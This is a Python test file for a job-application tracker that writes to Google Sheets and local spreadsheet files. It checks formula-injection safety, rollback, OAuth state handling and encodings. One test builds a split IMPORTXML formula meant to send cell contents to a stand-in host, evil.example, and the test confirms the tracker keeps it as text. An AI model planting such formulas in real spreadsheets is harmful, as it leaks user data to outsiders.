"""Formula safety, odd inputs and failures in every store (from the 0.3.0 review)."""

import json
import os
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime

import openpyxl
import pytest

from tracker_mcp import gsheets, server
from tracker_mcp.config import load_config
from tracker_mcp.scaffold import init, new_tracker
from tracker_mcp.stores import open_store
from tracker_mcp.tracker import Tracker, TrackerError

from .fake_sheets import FakeSheets
from .test_tracker import TODAY

URL = "https://docs.google.com/spreadsheets/d/abc123XYZ/edit#gid=0"
HEADERS = ["Company", "Role", "Status", "Date Applied", "Follow-up date", "Follow-up log", "Notes"]


def sheets(monkeypatch, tmp_path, data, dropdowns=None) -> FakeSheets:
    monkeypatch.setenv("TRACKER_MCP_HOME", str(tmp_path / "home"))
    fake = FakeSheets(data, dropdowns=dropdowns)
    monkeypatch.setattr(gsheets, "http_transport", lambda auth: fake)
    return fake


@pytest.fixture
def jobs(tmp_path, monkeypatch):
    return sheets(monkeypatch, tmp_path, {
        "Jobs": [HEADERS,
                 ["Acme", "EM", "Applied", datetime(2026, 9, 1), datetime(2026, 9, 11), None, None],
                 ["Globex", "Head of Eng", "Wishlist", None, None, None, None]],
    }, dropdowns={"Jobs": {3: ["Wishlist", "Applied", "Interview", "Offer", "Rejected", "Ghosted"]}})


def tracker(target=URL):
    return Tracker(target, config=load_config(target), today=lambda: TODAY)


# ---------------------------------------------------------------- formulas in Google Sheets

def test_appending_to_text_that_starts_with_equals_keeps_it_text(jobs):
    init(URL)
    t = tracker()
    t.add_application("Initech", "VP", notes='=IMPORTXML("http://evil.example/?d=')
    t.set_status(4, "Interview", note='"&A2&B2,"//a")')
    assert jobs.kind("Jobs", 4, 7) == "stringValue"
    assert jobs.value("Jobs", 4, 7).startswith('=IMPORTXML("http://evil.example/?d=')


def test_appending_to_a_formula_cell_and_undoing_it(jobs):
    jobs.set("Jobs", 2, 7, '=HYPERLINK("https://acme.example/job","posting")')
    init(URL)
    t = tracker()
    t.set_status(2, "Interview", note="call on Monday")
    assert jobs.kind("Jobs", 2, 7) == "stringValue"       # the appended text is text, not a broken formula
    t.undo_last_write()
    assert jobs.value("Jobs", 2, 7) == '=HYPERLINK("https://acme.example/job","posting")'
    assert jobs.kind("Jobs", 2, 7) == "formulaValue"


def test_a_failed_check_rolls_back_with_cell_kinds(jobs, monkeypatch):
    jobs.set("Jobs", 2, 7, "=1+1")
    jobs.set("Jobs", 3, 7, "=not a formula", kind="stringValue")
    init(URL)
    t = tracker()
    monkeypatch.setattr(Tracker, "_verify", lambda self, saved, changes: (_ for _ in ()).throw(
        TrackerError("Verification failed")))
    for row in (2, 3):
        with pytest.raises(TrackerError, match="Verification failed"):
            t.set_status(row, "Interview", note="call")
    assert jobs.value("Jobs", 2, 7) == "=1+1" and jobs.kind("Jobs", 2, 7) == "formulaValue"
    assert jobs.value("Jobs", 3, 7) == "=not a formula" and jobs.kind("Jobs", 3, 7) == "stringValue"
    assert jobs.value("Jobs", 2, 3) == "Applied"


# ---------------------------------------------------------------- odd Google Sheets

def test_tab_titles_openpyxl_refuses(tmp_path, monkeypatch):
    fake = sheets(monkeypatch, tmp_path, {
        "Jobs/2026": [HEADERS, ["Acme", "EM", "Applied", datetime(2026, 9, 1), None, None, "a\x0bb"]],
        "Archive: 2025": [["Company"], ["Old Co"]],
    })
    init(URL)
    t = tracker()
    assert t.describe()["data_rows"] == "2–2"
    t.add_application("Globex", "EM")
    assert fake.value("Jobs/2026", 3, 1) == "Globex"
    assert t.get_application("Acme")["applications"][0]["notes"] == "a b"   # control character dropped


def test_both_url_forms_name_the_same_sheet():
    assert gsheets.sheet_id("https://docs.google.com/spreadsheets/u/1/d/abc_-1/edit") == "abc_-1"
    assert gsheets.sheet_id(URL) == "abc123XYZ"


def test_no_network_is_a_readable_error(monkeypatch):
    class Auth:
        def header(self):
            return "Bearer x"

    def offline(*args, **kwargs):
        raise urllib.error.URLError("Name or service not known")

    monkeypatch.setattr(urllib.request, "urlopen", offline)
    with pytest.raises(TrackerError, match="Could not reach Google Sheets"):
        gsheets.http_transport(Auth())("GET", "https://sheets.googleapis.com/x", None)


def test_a_write_that_cannot_be_read_back_is_logged_and_not_undone(jobs, monkeypatch):
    init(URL)
    t = tracker()
    real = jobs.__call__
    state = {"posted": False}

    def flaky(method, url, body):
        if method == "POST":
            state["posted"] = True
        elif state["posted"]:
            raise TrackerError("Google Sheets error 429: quota")
        return real(method, url, body)

    monkeypatch.setattr(gsheets.time, "sleep", lambda s: None)
    t.store._call = flaky
    with pytest.raises(TrackerError, match="Do not repeat"):
        t.set_status(3, "Interview")
    assert jobs.value("Jobs", 3, 3) == "Interview"        # it did land
    entry = t.recent_writes(1)["writes"][0]
    assert entry["tool"] == "set_status" and entry["unverified"]
    t.store._call = real
    with pytest.raises(TrackerError, match="could not be checked"):
        t.undo_last_write()


def test_sign_in_ignores_strangers_and_keeps_the_token_private(tmp_path, monkeypatch):
    secret = tmp_path / "client.json"
    secret.write_text(json.dumps({"installed": {"client_id": "cid", "client_secret": "cs"}}), encoding="utf-8")
    seen = []

    def browser(url):
        q = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
        redirect, state = q["redirect_uri"], q["state"]

        def visit():
            for query in ("error=access_denied", "state=forged&code=evil", f"state={state}&code=good"):
                try:
                    urllib.request.urlopen(f"{redirect}?{query}", timeout=5).read()
                    seen.append(200)
                except urllib.error.HTTPError as e:
                    seen.append(e.code)
        threading.Thread(target=visit, daemon=True).start()
        return True

    exchanged = {}

    def post(url, fields):
        exchanged.update(fields)
        return {"refresh_token": "r", "access_token": "a"}

    monkeypatch.setattr(gsheets.webbrowser, "open", browser)
    monkeypatch.setattr(gsheets, "_post_form", post)
    monkeypatch.setenv("NO_PROXY", "127.0.0.1")
    monkeypatch.setenv("no_proxy", "127.0.0.1")
    token = gsheets.login(secret, token_file=tmp_path / "home" / "google-token.json")
    assert exchanged["code"] == "good" and seen == [404, 404, 200]
    assert json.loads(token.read_text(encoding="utf-8"))["refresh_token"] == "r"
    if sys.platform != "win32":
        assert token.stat().st_mode & 0o777 == 0o600


# ---------------------------------------------------------------- files

def test_other_spreadsheet_formats_are_refused_up_front(tmp_path):
    for name in ("t.xlsm", "t.xls", "t.ods", "t.numbers"):
        with pytest.raises(TrackerError, match="Save a copy of the tracker as .xlsx"):
            open_store(tmp_path / name)
    broken = tmp_path / "broken.xlsx"
    broken.write_text("not a zip", encoding="utf-8")
    with pytest.raises(TrackerError, match="not a readable .xlsx"):
        open_store(broken).load()


def test_a_windows_csv_keeps_its_encoding_and_line_endings(tmp_path):
    path = tmp_path / "jobs.csv"
    path.write_bytes("Company;Role;Status;Notes\n"
                     "Café Ltd;EM;Applied;naïve\x0b note\n".encode("cp1252"))
    init(path)
    t = tracker(path)
    assert t.get_application("Café")["applications"][0]["notes"] == "naïve  note"
    t.add_application("Société", "VP")
    data = path.read_bytes()
    assert b"\r\n" not in data and "Société;VP".encode("cp1252") in data
    with pytest.raises(TrackerError, match="CSV UTF-8"):
        t.add_application("Яндекс", "EM")                  # not in cp1252
    assert "Société" in path.read_bytes().decode("cp1252")


def test_first_start_with_a_symlinked_tracker(tmp_path, monkeypatch):
    real_dir, link_dir = tmp_path / "real", tmp_path / "link"
    real_dir.mkdir()
    link_dir.mkdir()
    book, cfg = new_tracker(real_dir / "jobs.xlsx")
    cfg.unlink()
    link = link_dir / "jobs.xlsx"
    try:
        os.symlink(book, link)
    except OSError:
        pytest.skip("no symlinks here")
    monkeypatch.setenv("TRACKER_PATH", str(link))
    monkeypatch.delenv("TRACKER_CONFIG", raising=False)
    for name, value in (("_tracker", None), ("_watch", None), ("_generated", None)):
        monkeypatch.setattr(server, name, value)
    assert server._describe()["config_generated"]["file"] == str(link_dir / "jobs.tracker-mcp.toml")


def test_summary_text_starting_with_equals_is_not_treated_as_a_formula(tmp_path):
    book, _ = new_tracker(tmp_path / "jobs.xlsx")
    wb = openpyxl.load_workbook(book)
    summary = [n for n in wb.sheetnames if n != load_config(book).sheet][0]
    cell = wb[summary]["H1"]
    cell.value = "=Applications!C2:C5 is how it is counted"
    cell.data_type = "s"
    wb.save(book)
    t = tracker(book)
    t.add_application("Acme", "EM")
    wb = openpyxl.load_workbook(book)
    assert wb[summary]["H1"].value == "=Applications!C2:C5 is how it is counted"
    assert wb[summary]["H1"].data_type == "s"
